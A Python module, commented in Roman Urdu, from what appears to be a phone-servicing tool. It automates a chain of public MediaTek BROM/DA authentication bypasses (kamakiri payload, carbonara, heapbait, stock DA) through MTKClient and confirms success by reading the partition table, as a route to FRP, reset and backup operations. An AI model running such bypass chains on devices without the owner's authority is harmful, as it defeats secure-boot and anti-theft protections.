"""
mtk_bypass_chain.py — "Latest Bypass (Auto)": MTK SLA/DAA auth ke
liye public bypass rason ki auto-try chain (research §3.5).

Ye op khud koi exploit NAHI chalata — ye sirf vendored MTKClient CLI
ko tartib se orchestrate karta hai, bilkul baqi MTK ops ki tarah:

  0. New-Auth guard (§4.3): sab se naye Dimensity chips (MT6835 /
     MT6878 / MT6983 nasal — Dimensity 6300/6400/7300/9000 class) par
     service entry "new Auth" mang sakti hai jo server-assisted ho
     sakti hai — wahan chain imaandari se ruk jati hai (🔒).
  1. `gettargetconfig` capture — sbc/daa/sla ki halat pehle parh lo.
  2. BROM payload (kamakiri family) — pre-V6 chips ka asal rasta.
  3. **Carbonara** — `--ptype carbonara` ke saath user ke DA se DA
     stage: MTKClient DA1 ko patch karke unsigned DA2 chalata hai
     (V6, jahan DA1 patched na ho).
  4. **Heapbait DA-stage route** — wahi DA baghair ptype ke: MTKClient
     ke xmlflash handler me DA1 load ke baad carbonara-check fail ho
     to heapbait khud try hota hai (vendored build ka apna module —
     engines/mtkclient/.../Exploit/heapbait.py).
  5. Preloader + user ka stock DA (`--stock`, unfused units) — aakhri
     public rasta.

Har koshish ki tasdeeq `printgpt` + GPT parse se hoti hai — GPT parh
li jaye to hi bypass "kaam kar gaya" kehlata hai. Tamam raste nakam
hon to imaandar 🔒 SERVER REQUIRED fail: fused + DAA/SLA/Remote-Auth
active units par public rasta documented hi nahi (research §3.6).
"""

import subprocess
import sys

from core import engines, mdm_list
from core.platforms_mtk import parse_gpt
from core.runner import APP_ROOT, BACKUPS_DIR, TOOLS_DIR  # noqa: F401

OP = {
    "id": "mtk_bypass_chain",
    "category": "MTK",
    "name": "Latest Bypass (Auto) — payload / carbonara / heapbait",
    "engine": "mtkclient",
    "modes": ("BROM", "PRELOADER"),
    "server_required": False,
}


def _engine(ctx):
    """(cmd_prefix, cwd) ya (None, None) — nakami par guided log de chuka hoga."""
    cmd, cwd, note = engines.find_mtkclient()
    if cmd is None:
        if note == "python_missing":
            for line in engines.python_missing_hint("MTKClient"):
                ctx.log(line, "WARN")
            return None, None
        ctx.log(note, "ERROR")
        ctx.log("Guide: MTKClient (open-source) ko app ke engines/mtkclient/ "
                "folder me rakho. Engine ke baghair bypass chain chal hi "
                "nahi sakti.", "WARN")
        return None, None
    ctx.log(f"MTKClient mila: {note}", "INFO")
    return cmd, cwd


def _guard(ctx) -> bool:
    dev = ctx.device
    if not dev or dev.mode not in OP["modes"]:
        ctx.log("Device BROM/Preloader mode me nahi mila. Phone band karke "
                "Volume dono dabaye hue cable lagao (kuch models par "
                "test-point lagta hai).", "ERROR")
        return False
    return True


def _capture(cmd, cwd, timeout=300):
    """Command chala kar (exit_code, poori output) — GPT parse ke liye."""
    kwargs = {}
    if sys.platform.startswith("win"):
        kwargs["creationflags"] = getattr(subprocess, "CREATE_NO_WINDOW", 0)
    try:
        out = subprocess.run([str(c) for c in cmd], capture_output=True,
                             text=True, timeout=timeout,
                             cwd=str(cwd) if cwd else None, **kwargs)
        return out.returncode, (out.stdout or "") + "\n" + (out.stderr or "")
    except Exception as e:  # noqa: BLE001
        return -1, str(e)


def _verify_gpt(ctx, cmd, cwd, args, label):
    """printgpt chala kar GPT parse — bypass ki asal tasdeeq.

    args: printgpt ke extra args (masalan --loader/--ptype/--stock).
    GPT parh li jaye to True, warna False (wajah log me)."""
    ctx.log(f"Tasdeeq ({label}): printgpt parha ja raha hai...", "INFO")
    rc, text = _capture(cmd + ["printgpt"] + args, cwd, timeout=300)
    for line in text.splitlines():
        if line.strip():
            ctx.log(line, "DATA")
    parts = parse_gpt(text)
    if rc == 0 and parts:
        ctx.log(f"✔ GPT parh li gayi ({len(parts)} partitions) — bypass "
                "kaam kar gaya. Ab is connection par MTK ops (FRP / "
                "reset / backup) chal sakte hain.", "OK")
        return True
    ctx.log(f"Tasdeeq ({label}) nakam — GPT nahi parhi ja saki "
            f"(exit code {rc}).", "WARN")
    return False


def _target_config(ctx, cmd, cwd):
    """gettargetconfig capture — sbc/daa/sla halat sirf maloomat ke liye."""
    ctx.log("Step 0: target config parha ja raha hai (sbc/daa/sla)...",
            "INFO")
    rc, text = _capture(cmd + ["gettargetconfig"], cwd, timeout=120)
    shown = False
    for line in text.splitlines():
        low = line.lower()
        if line.strip() and any(k in low for k in
                                ("sbc", "daa", "sla", "auth", "target",
                                 "config", "hw code", "me id")):
            ctx.log(line, "DATA")
            shown = True
    if rc != 0 or not shown:
        ctx.log("Target config saaf nahi parha ja saka — chain phir bhi "
                "aage barhegi; har rasta apni tasdeeq khud karega.", "WARN")
    return text


def run(ctx) -> bool:
    if not _guard(ctx):
        return False

    # --- New-Auth guard (§4.3): META-entry wali "new Auth" class ------
    dev = ctx.device
    pseudo_model = {"chipset": " ".join(str(x or "") for x in
                                        (dev.chip, dev.model, dev.detail))}
    if not mdm_list._new_auth_guard(ctx, pseudo_model):
        return False

    cmd, cwd = _engine(ctx)
    if cmd is None:
        return False

    ctx.log("Bypass chain tartib: payload → carbonara → heapbait "
            "(DA stage) → preloader + stock DA. Har rasta GPT se "
            "verify hoga.", "INFO")
    _target_config(ctx, cmd, cwd)
    if ctx.is_cancelled():
        return False

    da = engines.user_mtk_da()
    if da is not None:
        ctx.log(f"User ka DA mila: {da}", "INFO")
    else:
        ctx.log("tools/loaders/mtk/ me koi akele DA (.bin) nahi mila — "
                "carbonara / heapbait / stock-DA wale raste DA ke "
                "baghair nahi chal sakte; sirf payload wala rasta "
                "try hoga.", "WARN")

    # --- Rasta 1: BROM payload (kamakiri family) ----------------------
    ctx.progress(20, "Rasta 1/4: BROM payload try ho raha hai...")
    ctx.log("Rasta 1/4: BROM payload (kamakiri family) — pre-V6 chips "
            "par yahi asal bypass hai.", "INFO")
    code = ctx.stream(cmd + ["payload"], timeout=300, cwd=cwd)
    if ctx.is_cancelled():
        return False
    if code == 0:
        ctx.log("Payload lag gaya — ab GPT se tasdeeq:", "INFO")
        if _verify_gpt(ctx, cmd, cwd, [], "payload"):
            ctx.progress(95, "Bypass mukammal (payload)")
            return True
        ctx.log("Payload chala lekin GPT verify nahi hua — agla rasta "
                "try ho raha hai.", "WARN")
    else:
        ctx.log(f"Payload nahi laga (exit code {code}) — V6 chips par "
                "ye aam hai; DA wale raste aage hain.", "WARN")

    # --- Rasta 2: Carbonara (DA stage, --ptype carbonara) ------------
    ctx.progress(45, "Rasta 2/4: carbonara try ho raha hai...")
    ctx.log("Rasta 2/4: Carbonara — DA1 ko patch karke unsigned DA2 "
            "chalane wala rasta (V6, jahan DA1 patched na ho).", "INFO")
    if da is None:
        ctx.log("Skip: carbonara ke liye signed/stock DA1 chahiye jo "
                "tools/loaders/mtk/ me nahi hai. Stock firmware se "
                "nikla hua DA wahan rakho.", "WARN")
    elif _verify_gpt(ctx, cmd, cwd,
                     ["--loader", str(da), "--ptype", "carbonara"],
                     "carbonara"):
        ctx.progress(95, "Bypass mukammal (carbonara)")
        return True
    if ctx.is_cancelled():
        return False

    # --- Rasta 3: Heapbait (DA stage auto-route) ----------------------
    ctx.progress(65, "Rasta 3/4: heapbait (DA stage) try ho raha hai...")
    ctx.log("Rasta 3/4: Heapbait DA-stage route — DA load ke doran "
            "MTKClient ka apna heapbait module DA2 ki kamzori khud "
            "try karta hai (carbonara patched DA par yahi doosra "
            "darwaza hai).", "INFO")
    if da is None:
        ctx.log("Skip: heapbait bhi DA mangta hai — DA maujood nahi.",
                "WARN")
    elif _verify_gpt(ctx, cmd, cwd, ["--loader", str(da)], "heapbait"):
        ctx.progress(95, "Bypass mukammal (heapbait DA stage)")
        return True
    if ctx.is_cancelled():
        return False

    # --- Rasta 4: Preloader + stock DA (unfused) ----------------------
    ctx.progress(85, "Rasta 4/4: preloader + stock DA try ho raha hai...")
    ctx.log("Rasta 4/4: Preloader + stock DA (--stock) — sirf unfused "
            "units par chalta hai; koi patch nahi lagta.", "INFO")
    if da is None:
        ctx.log("Skip: stock DA bhi maujood nahi.", "WARN")
    elif _verify_gpt(ctx, cmd, cwd,
                     ["--loader", str(da), "--stock"], "stock DA"):
        ctx.progress(95, "Bypass mukammal (stock DA)")
        return True

    # --- Tamam raste nakam: imaandar 🔒 natija ------------------------
    ctx.log("Tamam public bypass raste nakam rahe.", "ERROR")
    ctx.log("🔒 Agar is unit par DAA / SLA / Remote-Auth active hai "
            "(fused unit), to public tor par is ka koi rasta "
            "documented NAHI hai — ye SERVER REQUIRED halat hai "
            "(research §3.6). Nakli bypass yahan nahi diya jayega.",
            "ERROR")
    ctx.log("Doosre darwaze: (1) DA ki build/patch tareekh purani ho "
            "to carbonara/heapbait ke chances barh jate hain — stock "
            "firmware se nikla purana DA try karo. (2) Transsion "
            "(Infinix/Tecno/Itel) ho to MDM List ka TMETA route is "
            "build ka documented working rasta hai.", "INFO")
    return False
